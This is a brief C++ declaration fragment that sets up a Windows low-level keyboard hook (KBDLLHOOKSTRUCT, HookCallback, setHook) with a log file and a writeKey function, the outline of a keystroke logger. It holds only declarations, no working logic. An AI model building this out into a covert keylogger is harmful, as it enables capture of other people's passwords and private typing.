#include <winuser.h>
#include <fstream>
#include <string>

std::ofstream logFile;

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

void writeKey(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

void setHook(std::ofstream logFile);



